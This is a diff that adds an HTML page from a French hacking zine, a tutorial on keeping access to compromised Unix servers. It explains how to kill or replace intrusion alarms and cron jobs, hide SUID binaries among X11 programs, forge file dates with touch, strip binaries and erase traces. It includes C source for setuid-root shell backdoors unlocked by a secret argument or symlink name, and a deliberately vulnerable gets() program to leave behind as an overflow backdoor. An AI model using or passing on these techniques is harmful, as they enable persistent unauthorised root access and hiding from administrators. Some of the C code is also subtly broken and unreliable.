@@ -1,0 +1,841 @@
+<html>
+<head>
+<title>hacking: backdoors</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFF8" text="#000000" link="#339966" vlink="#339966" alink="#339966">
+<font face="Verdana, Arial, Helvetica, sans-serif" size="2"> </font> 
+<table width="283" border="0" cellspacing="0" cellpadding="0" background="IMAGES/fnd_stitre.jpg" height="40">
+  <tr> 
+    <td width="23">&nbsp;</td>
+    <td width="294"><font face="Verdana, Arial, Helvetica, sans-serif" color="#FFCC00"><font color="#CCCCCC" size="2">BACKDOORS 
+      </font></font></td>
+  </tr>
+</table>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>Introduction</u></b><br>
+  <br>
+  Pour mon premier article pour Tipiak, je vais vous parler des backdoors et surtout 
+  vous en montrer quelques unes. Pour lire cet article, il vous faut un minimum 
+  de connaissances en matiere de UNIX/Linux et de programmation en C (les bases 
+  suffisent largement).<br>
+  Deja, pour les newbies nous allons definir le terme de &quot;backdoor&quot;. 
+  Une backdoor est un programme, un script ou encore une configuration qui permet 
+  au hacker de revenir sur un serveur qu'il a deja roote sans devoir refaire toute 
+  la demarche qu'il a fait pour ce hack. En clair, une backdoor est une sorte 
+  de trojan evolue (beaucoup BEAUCOUP plus evolue). Ok, certains d'entre vous 
+  se demandent souvent a quoi ca sert de revenir sur ses pas. A ceux la je repondrai 
+  ceci : on peut avoir diverses raisons pour revenir sur un serveur. Ces raisons<br>
+  peuvent etre l'oubli d'effacer une partie de ses traces (ouais bon, ca c'est 
+  rare et faut pas etre bien fin), employer ce serveur comme base pour driver 
+  des attaques sur d'autres serveurs (en effet, le serveur aura certainement une 
+  meilleur connexion que vous, donc vous serez plus puissant, et c'est le serveur 
+  qui sera logge sur la cible et non vous), ... En bref, on a toujours de bonnes 
+  raisons pour poser des backdoors.<br>
+  On peut distinguer deux types de backdoors : celles qui permettent de regagner 
+  un access sur le serveur et celles qui permettent de reprendre le root sur ledit 
+  serveur (bien sur on peut combiner les deux).</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><u><b>Precautions 
+  a prendre</b></u><br>
+  <br>
+  Avant de poser nos backdoors tout comme en les posant, il va falloir prendre 
+  un maximum de precautions. Deja, on veut garder notre hack discret et donc se 
+  demerder pour que l'admin ne se rende pas compte qu'il s'est fait pirate, ensuite 
+  on ne veut pas que l'admin tombe sur nos backdoors et nous les vire, donc il 
+  va falloir faire gaffe. La premiere chose a faire, c'est de verifier si aucun 
+  programme de surveillance ne tourne. Pour cela, on va faire un petit ps -e qui 
+  va nous dire quels processus sont en train de tourner. Si vous voyez un truc 
+  du style :<br>
+  <font color="#333333"># ps -ax</font></font></p>
+<table width="504" border="0" cellspacing="0" cellpadding="0">
+  <tr> 
+    <th width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">PID</font></div>
+    </th>
+    <th width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">TTY</font></div>
+    </th>
+    <th width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">STAT</font></div>
+    </th>
+    <th width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">TIME</font></div>
+    </th>
+    <th width="308"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">COMMAND</font></div>
+    </th>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">1</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:03</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">init 
+      [3]</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">2</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">SW</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">(kflushd)</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">3</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">SW&lt;</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">(kswapd)</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">4</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">SW</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">(md_thread)</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">5</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">SW</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">(md_thread)</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">36</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">/sbin/kerneld</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">172</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">syslogd</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">181</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">klogd</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">203</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">crond</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">215</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">inetd</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">226</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">/usr/sbin/snmpd</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">237</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">named</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">248</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">routed</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">260</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">rpc.rusersd</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">271</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">rwhod</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">287</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">sendmail: 
+      accepting connections on port 25</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">299</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">gpm 
+      -t ps/2</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">310</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">httpd</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">341</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">smbd 
+      -D</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">350</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">nmbd 
+      -D</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">369</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">4</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">/sbin/mingetty 
+      tty4</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">370</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">5</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">/sbin/mingetty 
+      tty5</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">371</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">6</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">/sbin/mingetty 
+      tty6</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">373</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">update 
+      (bdflush)</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">430</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">1</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">-bash</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">534</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">?</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">S</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">inetd</font></td>
+  </tr>
+  <tr> 
+    <td width="37"> 
+      <div align="right"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">569</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">1</font></div>
+    </td>
+    <td width="55"> 
+      <div align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">R</font></div>
+    </td>
+    <td width="52"> 
+      <div align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">0:00</font></div>
+    </td>
+    <td width="308"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">ps 
+      -ax</font></td>
+  </tr>
+</table>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> (bon vous aurez 
+  carrement plus de lignes mais je prend un exemple chez moi)<br>
+  Je disais donc, si vous voyez un truc de ce style c'est bon signe par contre 
+  si au milieu de tout ca vous voyez un nom du style &quot;alarm&quot; ou autre 
+  c'est peut etre problematique. Killez le et etudiez le tranquillement avec gdb 
+  si vous le pouvez (connaissances en ASM requises) histoire de voir ce qu'il 
+  fait, agissez en fonction du programme : si il log des trucs dans un fichier, 
+  effacez vos traces de ce fichier, si il matte les nouveaux SUID, killez le le 
+  temps de poser vos doors... Bon, je pense que vous cernez le probleme et que 
+  vous voyez comment s'en debarrasser, par contre une fois le tout pose, relancez 
+  le programme histoire que l'admin hallucine pas en voyant sa belle merde killee!</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> Evidemment, il 
+  n'y a pas que les processus a regarder, il y a aussi les crontabs. Je n'exposerai 
+  rien la dessus vu que c'est tres connu, regardez juste les crons du root et 
+  agissez comme pour les processus, sauf que la si un programme mate les nouveaux 
+  SUID ou un truc du style, virez le carrement des crons ou alors effacez le et 
+  remplacez le par un programme 'made in vous' qui fait quelque chose de bien 
+  special (evidemment donnez le meme nom que l'alarme qu'il est cense remplacer 
+  et surtout faites pas la connerie de reactiver l' alarme). Si vous avez un probleme 
+  avec les crons, rappelez vous que la commande 'man' peut toujours servir.</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> Maintenant qu'on 
+  a desactive toutes les alarmes automatiques potentielles (bah vi je dis automatique 
+  parce que si le root les execute a la main vous pouvez toujours vous gratter 
+  pour les trouver...a moins d'eplucher tous les programmes du serveur) il va 
+  falloir les planquer nos backdoors car il est evidemment hors de question de 
+  mettre un truc dans le home du root du style :</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> -rwsr-sr-x &nbsp;&nbsp;1 
+  root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  0 Apr 17 03:39 BACKDOOR</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> C'est un petit 
+  peu voyant comme affaire! Au lieu de ca, on va parcourir l'arborescence du serveur 
+  jusqu'a tomber sur des repertoires du style :<br>
+  /usr/X11/bin<br>
+  Dans ce repertoire sont stockees les commandes de X-Windows, elles sont nombreuses 
+  et certaines sont SUID ce qui fait que c'est un endroit assez ideal pour planquer 
+  nos doors. Evidemment, il y a beaucoup mieux comme les repertoires ou sont stockes 
+  des fichiers de config, de demarrage... Mais les bin sont assez sympas. Apres 
+  avoir trouve ce repertoire, on regarde un peu les nom des fichiers dedans :<br>
+  &nbsp;&nbsp;# ls|more<br>
+  &nbsp;&nbsp;ASSound<br>
+  &nbsp;&nbsp;Animate<br>
+  &nbsp;&nbsp;AnotherLevel<br>
+  &nbsp;&nbsp;Audio<br>
+  &nbsp;&nbsp;Auto<br>
+  &nbsp;&nbsp;Banner<br>
+  &nbsp;&nbsp;Cascade<br>
+  &nbsp;&nbsp;Clean<br>
+  &nbsp;&nbsp;Form<br>
+  &nbsp;&nbsp;Ident<br>
+  &nbsp;&nbsp;Pager<br>
+  &nbsp;&nbsp;Pager_noxpm<br>
+  &nbsp;&nbsp;RunWM<br>
+  &nbsp;&nbsp;RunWM.AfterStep<br>
+  &nbsp;&nbsp;RunWM.Fvwm95<br>
+  &nbsp;&nbsp;RunWM.MWM<br>
+  &nbsp;&nbsp;RunWM.WindowMaker</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> STOP! On s'arrete 
+  la : on viens de trouver des noms bien trash (meme s'ils ne representent ici 
+  en fait que les noms des modes graphiques de X : motif, afterstep...). Ok, voyons 
+  notre fichier backdoor va recevoir un nom en fonction de celui de ces fichiers. 
+  RunWM.Motif sera parfait pour l'illusion (arf! et MWM alors? ;). Ok, mais si 
+  l'admin mate bien le fichier il verra qu'il est plus recent que ses petits camarades 
+  a cause de cette putain de commande &quot;ls -l&quot;. Qu'a cela ne tienne, 
+  on va le rendre un petit peu plus vieux, aussi age que ses collegues :) grace 
+  a la commande touch :</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <font color="#333333"># 
+  touch -r RunWM.MWM RunWM.Motif</font></font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> Ceci aura pour 
+  effet de mettre a RunWM.Motif la meme date de derniere modification que RunWM.MWM. 
+  La syntaxe est :</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <font color="#333333">#touch 
+  -r &lt;fichier de reference&gt; &lt;fichier dont on veut changer la date&gt;</font></font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> Neanmoins, il 
+  ne faut pas oublier un petit truc : apres avoir compile notre door, nous allons 
+  la &quot;stripper&quot; : nous allons virer du binaire la table des symboles, 
+  les bits de realocation et les infos placees par les debugger ce qui aura pour 
+  effet d'abaisser la taille du binaire et donc de le rendre encore plus invisible...</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <font color="#333333"># 
+  strip Run.WM.Motif</font></font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> Voila, notre fichier 
+  est bien au chaud, on retourne a la maison :</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <font color="#333333"># 
+  cd</font></font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> Bien, maintenant 
+  on s'arrache en effacant bien nos traces et reactivez les alarmes a reactiver. 
+  Oubliez pas d'effacer tous les petits .c et autres choses du genre qui vont 
+  on servit et N'OUBLIEZ JAMAIS D'EFFACER VOS TRACES A CHAQUE SERVEUR VISITE, 
+  MEME SI VOUS ETES VENU GRACE A L'AIDE D'UNE DE VOS BACKDOORS!</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>Backdoor 
+  setuid(), setgid()</u></b><br>
+  <br>
+  Cette backdoor est vraiment simple et vous permet de rechopper le root.<br>
+  Voici le source :<br>
+  -------------------------------------------------------------------------------<br>
+  <font color="#333333">#include &lt;stdio.h&gt;<br>
+  #include &lt;unistd.h&gt;<br>
+  main(int argc,char *argv[])<br>
+  {<br>
+  if(argv[1]=&quot;rootme&quot;) {<br>
+  setuid(0);<br>
+  setgid(0);<br>
+  system(&quot;/bin/sh&quot;);<br>
+  } else {<br>
+  printf(&quot;Bus Error\n&quot;);<br>
+  return 0;<br>
+  }</font><br>
+  -------------------------------------------------------------------------------<br>
+  Ok, cette door est vraiment simple : si elle est appelee avec l'argument rootme, 
+  le processus de la door va voir ses UID et GID mis a 0,<br>
+  c'est-a-dire avec l'identifiant root, donc toute fonction appelee ensuite sera 
+  executee as root, c'est le cas de la fonction system() qui nous sort un petit 
+  shell ici, et comme le processus est as root, on a un shell root :))), sans 
+  l'argument rootme, le programme affiche &quot;bus error&quot; et se termine. 
+  Planquez le comme je vous l'ai explique plus haut, mettez le SUID et executable 
+  pour tous. Ce qui a de pas mal, c'est que pour que ce truc marche comme on veut 
+  (c'est-a- dire qu'il nous root), il faut connaitre le bon argument, sinon, le 
+  programme affiche une fausse erreur et se termine. Cela dit, il est possible 
+  de faire du meme genre mais en mieux :<br>
+  -------------------------------------------------------------------------------<br>
+  <font color="#333333">#include &lt;stdio.h&gt;<br>
+  #include &lt;unistd.h&gt;<br>
+  main(int argc, char *argv[])<br>
+  {<br>
+  if(argv[0]==&quot;.Xenvprofile&quot;) {<br>
+  setuid(0);<br>
+  setgid(0);<br>
+  system(&quot;/bin/sh&quot;);<br>
+  } else { printf(&quot;Bus error\n&quot;); }<br>
+  return 0;<br>
+  }</font><br>
+  -------------------------------------------------------------------------------<br>
+  Ok, une fois qu'on aura compile ce code et nomme Run.Motif, on le rendra world 
+  writable et SUID root. Quand on voudra reprendre le root, on se prendra pas 
+  la tete : on cree un lien symbolique vers Run.Motif nomme .Xenvprofileet on 
+  l' execute, ce qui nous mets root (if(argv[0]==&quot;.Xenvprofile&quot;), comme 
+  on appelle le programme avec .Xenvprofile on nous mets root, le programme etant 
+  appele<br>
+  avec ce nom a travers le lien symbolique...). Une fois root, on efface notre 
+  lien. Deja qu'il y avait peu de chances pour qu'une personne exterieure trouve 
+  le bon argument (exemple precedent), la pour deviner qu'il faut creer un lien 
+  qui porte tel nom, faut avoir un QI de plus de 10000 et une chance enorme.</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <u><b>Backdoor 
+  buffer overflow</b></u><br>
+  <br>
+  Je deconseille l'utilisation de cette door : il y a plus simple et moins chiant, 
+  enfin voici le principe quand meme... Nous allons coder un tout petit programme 
+  qu'on pourra overflower facilement. Il nous suffira de le rendre root SUID et 
+  de coder un BoF contre a l'aide de gdb. Voila le code d'un programme exploitable 
+  :<br>
+  -------------------------------------------------------------------------------<br>
+  <font color="#333333">#include &lt;stdio.h&gt;<br>
+  main()<br>
+  {<br>
+  char exploit[50];<br>
+  gets(exploit);<br>
+  return 0;<br>
+  }</font><br>
+  -------------------------------------------------------------------------------<br>
+  Je ne compte pas expliquer comment faire un buffer overflow car cette technique 
+  merite un article a elle seule. Si vous avez des problemes, allez lire Phrack50, 
+  &quot;Smashing the stack for fun and profit&quot;, de Aleph1.</font></p>
